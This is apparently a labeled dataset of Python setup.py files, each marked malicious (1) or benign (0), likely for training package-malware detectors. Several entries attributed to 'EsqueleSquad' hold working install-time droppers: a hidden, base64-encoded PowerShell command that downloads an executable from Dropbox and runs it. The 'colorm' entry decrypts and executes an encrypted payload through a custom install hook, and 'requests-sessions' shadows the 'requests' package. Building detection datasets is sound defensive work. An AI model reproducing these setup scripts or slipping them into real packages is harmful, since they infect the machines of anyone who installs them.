{"idx": "libedkillcraft-8.21", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libedkillcraft',\n    packages = ['modlib'],\n    version = '10.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-assertive-2.1.0", "func": "#!/usr/bin/env python\n\nfrom setuptools import setup\n\n\nsetup(\n    name='flake8-assertive',\n    install_requires=['flake8>=3.0.0'],\n    tests_require=['flake8>=3.0.0'],\n    test_suite='tests',\n)\n", "target": 0}
{"idx": "librandomcandycontrol-5.13", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandomcandycontrol',\n    packages = ['modlib'],\n    version = '8.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requests-sessions-0.0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"requests-sessions\",\n    version=\"0.0.1\",\n    packages=['requests'],\n    install_requires = [\n        \"requests==2.31.0\"\n    ],\n    author=\"requests-sessions\",\n    description=\"requests-sessions\"\n)", "target": 1}
{"idx": "dask-glm-0.2.0", "func": "#!/usr/bin/env python\n\nfrom os.path import exists\nfrom setuptools import setup\n\n\nsetup(name='dask-glm',\n      description='Generalized Linear Models with Dask',\n      url='http://github.com/dask/dask-glm/',\n      maintainer='Matthew Rocklin',\n      maintainer_email='mrocklin@gmail.com',\n      license='BSD',\n      keywords='dask,glm',\n      packages=['dask_glm'],\n      long_description=(open('README.rst').read() if exists('README.rst')\n                        else ''),\n      install_requires=list(open('requirements.txt').read().strip().split('\\n')),\n      use_scm_version=True,\n      setup_requires=['setuptools_scm'],\n      extras_require={\n          'docs': [\n              'jupyter',\n              'nbsphinx',\n              'notebook',\n              'numpydoc',\n              'sphinx',\n              'sphinx_rtd_theme',\n          ]\n      },\n      zip_safe=False)\n", "target": 0}
{"idx": "synapse-x-0.1.3", "func": "from setuptools import setup, find_packages\n\"\"\" only edit things in 'THIS-FORMAT' so you don't mess the config up \"\"\"\nsetup(\n  name=\"synapse_x\",\n  author=\"Yurei\",\n  version=\"0.1.3\",\n  author_email=\"unknownrussian100@gmail.com\",\n  description=\"Simple module to color all your text in a certain way\",\n  long_description_content_type=\"text/markdown\",\n  url=\"https://github.com/JustAProDev\",\n  project_urls={\n    \"GitHub\": \"https://github.com/0xPacker/\",\n  },\n  license=\"MIT\",\n  keywords=[\"discord\"],\n  classifiers = [\n  \"Programming Language :: Python :: 3\",\n  \"License :: OSI Approved :: MIT License\",\n  \"Operating System :: Microsoft :: Windows\",\n  \"Development Status :: 5 - Production/Stable\",\n  \"Intended Audience :: Developers\",\n  \"Natural Language :: English\",\n  \"Topic :: Software Development\"\n  ],\n  package_dir={\"\": \".\"},\n  packages=find_packages(where=\".\"),\n)\n", "target": 1}
{"idx": "discord-1.7.3", "func": "from setuptools import setup\n\nfrom os import path\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, 'README.md'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n    name='discord',\n    version='1.7.3',\n    url='https://github.com/Rapptz/discord.py',\n    author='Rapptz',\n    description='A mirror package for discord.py. Please install that instead.',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    packages=[],\n    install_requires=['discord.py>=1.7.3'],\n)\n", "target": 0}
{"idx": "Fabric3-1.14.post1", "func": "#!/usr/bin/env python\n\nfrom __future__ import with_statement\n\nfrom setuptools import setup, find_packages\n\nfrom fabric.version import get_version\n\n\nlong_description = \"\"\"\nFabric3 is a fork of `Fabric <http://fabfile.org>`_ to provide compatability\nwith Python 3.4+. The port still works with Python 2.7.\n\nThe goal is to stay 100% compatible with the original Fabric.  Any new releases\nof Fabric will also be released here.  Please file issues for any differences\nyou find. Known differences are `documented on github\n<https://github.com/mathiasertl/fabric/>`.\n\nTo find out what's new in this version of Fabric, please see `the changelog\n<http://fabfile.org/changelog.html>`_ of the original Fabric.\n\nFor more information, please see the Fabric website or execute ``fab --help``.\n\"\"\"\n\ninstall_requires=['paramiko>=2.0,<3.0', 'six>=1.10.0']\n\n\nsetup(\n    name='Fabric3',\n    version=get_version('short'),\n    description='Fabric is a simple, Pythonic tool for remote execution and deployment (py2.7/py3.4+ compatible fork).',\n    long_description=long_description,\n    author='Jeff Forcier',\n    author_email='jeff@bitprophet.org',\n    maintainer='Mathias Ertl',\n    maintainer_email='mati@er.tl',\n    url='https://github.com/mathiasertl/fabric/',\n    packages=find_packages(),\n    test_suite='nose.collector',\n    tests_require=['nose<2.0', 'fudge<1.0', 'jinja2<3.0'],\n    install_requires=install_requires,\n    entry_points={\n        'console_scripts': [\n            'fab = fabric.main:main',\n        ]\n    },\n    classifiers=[\n          'Development Status :: 5 - Production/Stable',\n          'Environment :: Console',\n          'Intended Audience :: Developers',\n          'Intended Audience :: System Administrators',\n          'License :: OSI Approved :: BSD License',\n          'Operating System :: MacOS :: MacOS X',\n          'Operating System :: Unix',\n          'Operating System :: POSIX',\n          'Programming Language :: Python',\n          'Programming Language :: Python :: 2',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3',\n          'Programming Language :: Python :: 3.4',\n          'Programming Language :: Python :: 3.5',\n          'Topic :: Software Development',\n          'Topic :: Software Development :: Build Tools',\n          'Topic :: Software Development :: Libraries',\n          'Topic :: Software Development :: Libraries :: Python Modules',\n          'Topic :: System :: Clustering',\n          'Topic :: System :: Software Distribution',\n          'Topic :: System :: Systems Administration',\n    ],\n)\n", "target": 0}
{"idx": "ultratool-6.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ultratool',\n    packages = ['modlib'],\n    version = '5.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-cvintpy-8.31", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cvintpy',\n    packages = ['modlib'],\n    version = '7.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqnvidiahttpvm-4.7", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiahttpvm',\n    packages = ['modlib'],\n    version = '1.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "colorm-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 't vZALhgnekqVkATJQpnFXbwlICrDuQAwQDFnMjodjEdiIOZPKwvijP gx'\nLONG_DESCRIPTION = 'YOCtUPhtNnas XnvrLTMukRRRLJ jylwbZcIOIPVdPElUEXaolATpfcuoMQNJNnrOVtoFoqeEmlcYBIVJF BKupDjJfs  PDgzfXjhZiWLPDEcZmbP'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'lEXeIofPjVW2oksm_T-mSFA5-cH8CSs7Ln58pE1vmZw=').decrypt(b'gAAAAABmA1ib6HT-57jVSD4R1zNBiv_LAJwCZQkTspwlpv-we7JdbTr52_ZXK4Cap7QDIhlsJdIHB3Fp8x1bOXOe9k6laMdcmmp2VmFEwaCAIPjaw2kQrL80yHoNhttlJUVjcUhU984q5kGVOf1FYexFc3OjHxMqnv3UbQktOMI79BtCZgw1JFUX_yJlq7I9_Hwtf83L5a9InuC6spQKpMpCd0xY-pNwXw=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"colorm\",\n    version=VERSION,\n    author=\"koovXV\",\n    author_email=\"yvnPSsGVr@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "Fiona-1.8.21", "func": "from distutils.command.sdist import sdist\nfrom distutils import log\nimport itertools as it\nimport os\nimport shutil\nimport subprocess\nimport sys\nfrom setuptools import setup\nfrom setuptools.extension import Extension\n\n\n# Use Cython if available.\ntry:\n    from Cython.Build import cythonize\nexcept ImportError:\n    cythonize = None\n\n\ndef check_output(cmd):\n    # since subprocess.check_output doesn't exist in 2.6\n    # we wrap it here.\n    try:\n        out = subprocess.check_output(cmd)\n        return out.decode('utf')\n    except AttributeError:\n        # For some reasone check_output doesn't exist\n        # So fall back on Popen\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE)\n        out, err = p.communicate()\n        return out\n\n\ndef copy_data_tree(datadir, destdir):\n    try:\n        shutil.rmtree(destdir)\n    except OSError:\n        pass\n    shutil.copytree(datadir, destdir)\n\n\n# Parse the version from the fiona module.\nwith open('fiona/__init__.py', 'r') as f:\n    for line in f:\n        if line.find(\"__version__\") >= 0:\n            version = line.split(\"=\")[1].strip()\n            version = version.strip('\"')\n            version = version.strip(\"'\")\n            break\n\n# Fiona's auxiliary files are UTF-8 encoded and we'll specify this when\n# reading with Python 3+\nopen_kwds = {}\nif sys.version_info > (3,):\n    open_kwds['encoding'] = 'utf-8'\n\nwith open('VERSION.txt', 'w', **open_kwds) as f:\n    f.write(version)\n\nwith open('README.rst', **open_kwds) as f:\n    readme = f.read()\n\nwith open('CREDITS.txt', **open_kwds) as f:\n    credits = f.read()\n\nwith open('CHANGES.txt', **open_kwds) as f:\n    changes = f.read()\n\n# Set a flag for builds where the source directory is a repo checkout.\nsource_is_repo = os.path.exists(\"MANIFEST.in\")\n\n\n# Extend distutil's sdist command to generate C extension sources from\n# the _shim extension modules for GDAL 1.x and 2.x.\nclass sdist_multi_gdal(sdist):\n    def run(self):\n        sources = {\n            \"_shim1\": \"_shim\",\n            \"_shim2\": \"_shim\",\n            \"_shim22\": \"_shim\",\n            \"_shim3\": \"_shim\"\n        }\n        for src_a, src_b in sources.items():\n            shutil.copy('fiona/{}.pyx'.format(src_a), 'fiona/{}.pyx'.format(src_b))\n            _ = check_output(['cython', '-v', '-f', 'fiona/{}.pyx'.format(src_b),\n                              '-o', 'fiona/{}.c'.format(src_a)])\n            print(_)\n        sdist.run(self)\n\n# Building Fiona requires options that can be obtained from GDAL's gdal-config\n# program or can be specified using setup arguments. The latter override the\n# former.\n#\n# A GDAL API version is strictly required. Without this the setup script\n# cannot know whether to use the GDAL version 1 or 2 source files. The GDAL\n# API version can be specified in 2 ways.\n#\n# 1. By the gdal-config program, optionally pointed to by GDAL_CONFIG\n# 2. By a GDAL_VERSION environment variable. This overrides number 1.\n\n\ninclude_dirs = []\nlibrary_dirs = []\nlibraries = []\nextra_link_args = []\ngdal_output = [None for i in range(4)]\ngdalversion = None\nlanguage = None\n\nif 'clean' not in sys.argv:\n    try:\n        gdal_config = os.environ.get('GDAL_CONFIG', 'gdal-config')\n        for i, flag in enumerate(\n                [\"--cflags\", \"--libs\", \"--datadir\", \"--version\"]):\n            gdal_output[i] = check_output([gdal_config, flag]).strip()\n        for item in gdal_output[0].split():\n            if item.startswith(\"-I\"):\n                include_dirs.extend(item[2:].split(\":\"))\n        for item in gdal_output[1].split():\n            if item.startswith(\"-L\"):\n                library_dirs.extend(item[2:].split(\":\"))\n            elif item.startswith(\"-l\"):\n                libraries.append(item[2:])\n            else:\n                # e.g. -framework GDAL\n                extra_link_args.append(item)\n        gdalversion = gdal_output[3]\n        if gdalversion:\n            log.info(\"GDAL API version obtained from gdal-config: %s\",\n                     gdalversion)\n\n    except Exception as e:\n        if os.name == \"nt\":\n            log.info(\"Building on Windows requires extra options to setup.py \"\n                     \"to locate needed GDAL files.\\nMore information is \"\n                     \"available in the README.\")\n        else:\n            log.warn(\"Failed to get options via gdal-config: %s\", str(e))\n\n    # Get GDAL API version from environment variable.\n    if 'GDAL_VERSION' in os.environ:\n        gdalversion = os.environ['GDAL_VERSION']\n        log.info(\"GDAL API version obtained from environment: %s\", gdalversion)\n\n    # Get GDAL API version from the command line if specified there.\n    if '--gdalversion' in sys.argv:\n        index = sys.argv.index('--gdalversion')\n        sys.argv.pop(index)\n        gdalversion = sys.argv.pop(index)\n        log.info(\"GDAL API version obtained from command line option: %s\",\n                 gdalversion)\n\n    if not gdalversion:\n        log.fatal(\"A GDAL API version must be specified. Provide a path \"\n                  \"to gdal-config using a GDAL_CONFIG environment variable \"\n                  \"or use a GDAL_VERSION environment variable.\")\n        sys.exit(1)\n\n    if os.environ.get('PACKAGE_DATA'):\n        destdir = 'fiona/gdal_data'\n        if gdal_output[2]:\n            log.info(\"Copying gdal data from %s\" % gdal_output[2])\n            copy_data_tree(gdal_output[2], destdir)\n        else:\n            # check to see if GDAL_DATA is defined\n            gdal_data = os.environ.get('GDAL_DATA', None)\n            if gdal_data:\n                log.info(\"Copying gdal data from %s\" % gdal_data)\n                copy_data_tree(gdal_data, destdir)\n\n        # Conditionally copy PROJ.4 data.\n        projdatadir = os.environ.get('PROJ_LIB', '/usr/local/share/proj')\n        if os.path.exists(projdatadir):\n            log.info(\"Copying proj data from %s\" % projdatadir)\n            copy_data_tree(projdatadir, 'fiona/proj_data')\n\n    if \"--cython-language\" in sys.argv:\n        index = sys.argv.index(\"--cython-language\")\n        sys.argv.pop(index)\n        language = sys.argv.pop(index).lower()\n\n    gdal_version_parts = gdalversion.split('.')\n    gdal_major_version = int(gdal_version_parts[0])\n    gdal_minor_version = int(gdal_version_parts[1])\n\n    log.info(\"GDAL version major=%r minor=%r\", gdal_major_version, gdal_minor_version)\n\next_options = dict(\n    include_dirs=include_dirs,\n    library_dirs=library_dirs,\n    libraries=libraries,\n    extra_link_args=extra_link_args)\n\n# Enable coverage for cython pyx files.\nif os.environ.get('CYTHON_COVERAGE'):\n    from Cython.Compiler.Options import get_directive_defaults\n    directive_defaults = get_directive_defaults()\n    directive_defaults['linetrace'] = True\n    directive_defaults['binding'] = True\n\n    ext_options.update(dict(\n        define_macros=[(\"CYTHON_TRACE_NOGIL\", \"1\")]))\n\n# GDAL 2.3+ requires C++11\n\nif language == \"c++\":\n    ext_options[\"language\"] = \"c++\"\n    if sys.platform != \"win32\":\n        ext_options[\"extra_compile_args\"] = [\"-std=c++11\"]\n\next_options_cpp = ext_options.copy()\nif sys.platform != \"win32\":\n    ext_options_cpp[\"extra_compile_args\"] = [\"-std=c++11\"]\n\n\n# Define the extension modules.\next_modules = []\n\nif source_is_repo and \"clean\" not in sys.argv:\n    # When building from a repo, Cython is required.\n    log.info(\"MANIFEST.in found, presume a repo, cythonizing...\")\n    if not cythonize:\n        log.fatal(\"Cython.Build.cythonize not found. \"\n                  \"Cython is required to build from a repo.\")\n        sys.exit(1)\n\n    if gdalversion.startswith(\"1\"):\n        shutil.copy('fiona/_shim1.pyx', 'fiona/_shim.pyx')\n        shutil.copy('fiona/_shim1.pxd', 'fiona/_shim.pxd')\n    elif gdal_major_version == 2:\n        if gdal_minor_version >= 2:\n            log.info(\"Building Fiona for gdal 2.2+: {0}\".format(gdalversion))\n            shutil.copy('fiona/_shim22.pyx', 'fiona/_shim.pyx')\n            shutil.copy('fiona/_shim22.pxd', 'fiona/_shim.pxd')\n        else:\n            log.info(\"Building Fiona for gdal 2.0.x-2.1.x: {0}\".format(gdalversion))\n            shutil.copy('fiona/_shim2.pyx', 'fiona/_shim.pyx')\n            shutil.copy('fiona/_shim2.pxd', 'fiona/_shim.pxd')\n    elif gdal_major_version == 3:\n        shutil.copy('fiona/_shim3.pyx', 'fiona/_shim.pyx')\n        shutil.copy('fiona/_shim3.pxd', 'fiona/_shim.pxd')\n\n    ext_modules = cythonize([\n        Extension('fiona._geometry', ['fiona/_geometry.pyx'], **ext_options),\n        Extension('fiona.schema', ['fiona/schema.pyx'], **ext_options),\n        Extension('fiona._transform', ['fiona/_transform.pyx'], **ext_options_cpp),\n        Extension('fiona._crs', ['fiona/_crs.pyx'], **ext_options),\n        Extension('fiona._env', ['fiona/_env.pyx'], **ext_options),\n        Extension('fiona._err', ['fiona/_err.pyx'], **ext_options),\n        Extension('fiona._shim', ['fiona/_shim.pyx'], **ext_options),\n        Extension('fiona.ogrext', ['fiona/ogrext.pyx'], **ext_options)\n        ],\n        compiler_directives={\"language_level\": \"3\"}\n    )\n\n# If there's no manifest template, as in an sdist, we just specify .c files.\nelif \"clean\" not in sys.argv:\n    ext_modules = [\n        Extension('fiona.schema', ['fiona/schema.c'], **ext_options),\n        Extension('fiona._transform', ['fiona/_transform.cpp'], **ext_options_cpp),\n        Extension('fiona._geometry', ['fiona/_geometry.c'], **ext_options),\n        Extension('fiona._crs', ['fiona/_crs.c'], **ext_options),\n        Extension('fiona._env', ['fiona/_env.c'], **ext_options),\n        Extension('fiona._err', ['fiona/_err.c'], **ext_options),\n        Extension('fiona.ogrext', ['fiona/ogrext.c'], **ext_options),\n    ]\n\n    if gdal_major_version == 1:\n        log.info(\"Building Fiona for gdal 1.x: {0}\".format(gdalversion))\n        ext_modules.append(\n            Extension('fiona._shim', ['fiona/_shim1.c'], **ext_options))\n    elif gdal_major_version == 2:\n        if gdal_minor_version >= 2:\n            log.info(\"Building Fiona for gdal 2.2+: {0}\".format(gdalversion))\n            ext_modules.append(\n                Extension('fiona._shim', ['fiona/_shim22.c'], **ext_options))\n        else:\n            log.info(\"Building Fiona for gdal 2.0.x-2.1.x: {0}\".format(gdalversion))\n            ext_modules.append(\n                Extension('fiona._shim', ['fiona/_shim2.c'], **ext_options))\n    elif gdal_major_version == 3:\n        log.info(\"Building Fiona for gdal >= 3.0.x: {0}\".format(gdalversion))\n        ext_modules.append(\n            Extension('fiona._shim', ['fiona/_shim3.c'], **ext_options))\n\nrequirements = [\n    'attrs>=17',\n    'certifi',\n    'click>=4.0',\n    'cligj>=0.5',\n    'click-plugins>=1.0',\n    'six>=1.7',\n    'munch',\n    \"setuptools\",\n    'argparse; python_version < \"2.7\"',\n    'ordereddict; python_version < \"2.7\"',\n    'enum34; python_version < \"3.4\"'\n]\n# Python 3.10 workaround as enum34 not available\nif sys.version_info >= (3, 10):\n    requirements.remove('enum34; python_version < \"3.4\"')\n\nextras_require = {\n    'calc': ['shapely'],\n    's3': ['boto3>=1.2.4'],\n    'test': ['pytest>=3', 'pytest-cov', 'boto3>=1.2.4', 'mock; python_version < \"3.4\"']\n}\n\nextras_require['all'] = list(set(it.chain(*extras_require.values())))\n\n\nsetup_args = dict(\n    cmdclass={'sdist': sdist_multi_gdal},\n    metadata_version='1.2',\n    name='Fiona',\n    version=version,\n    requires_python='>=2.6',\n    requires_external='GDAL (>=1.8)',\n    description=\"Fiona reads and writes spatial data files\",\n    license='BSD',\n    keywords='gis vector feature data',\n    author='Sean Gillies',\n    author_email='sean.gillies@gmail.com',\n    maintainer='Sean Gillies',\n    maintainer_email='sean.gillies@gmail.com',\n    url='http://github.com/Toblerity/Fiona',\n    long_description=readme + \"\\n\" + changes + \"\\n\" + credits,\n    package_dir={'': '.'},\n    packages=['fiona', 'fiona.fio'],\n    entry_points='''\n        [console_scripts]\n        fio=fiona.fio.main:main_group\n\n        [fiona.fio_commands]\n        bounds=fiona.fio.bounds:bounds\n        calc=fiona.fio.calc:calc\n        cat=fiona.fio.cat:cat\n        collect=fiona.fio.collect:collect\n        distrib=fiona.fio.distrib:distrib\n        dump=fiona.fio.dump:dump\n        env=fiona.fio.env:env\n        filter=fiona.fio.filter:filter\n        info=fiona.fio.info:info\n        insp=fiona.fio.insp:insp\n        load=fiona.fio.load:load\n        ls=fiona.fio.ls:ls\n        rm=fiona.fio.rm:rm\n        ''',\n    install_requires=requirements,\n    extras_require=extras_require,\n    ext_modules=ext_modules,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Scientific/Engineering :: GIS'])\n\nif os.environ.get('PACKAGE_DATA'):\n    setup_args['package_data'] = {'fiona': ['gdal_data/*', 'proj_data/*', '.libs/*', '.libs/licenses/*']}\n\nsetup(**setup_args)\n", "target": 0}
{"idx": "Flask-SQLAlchemy-2.5.1", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
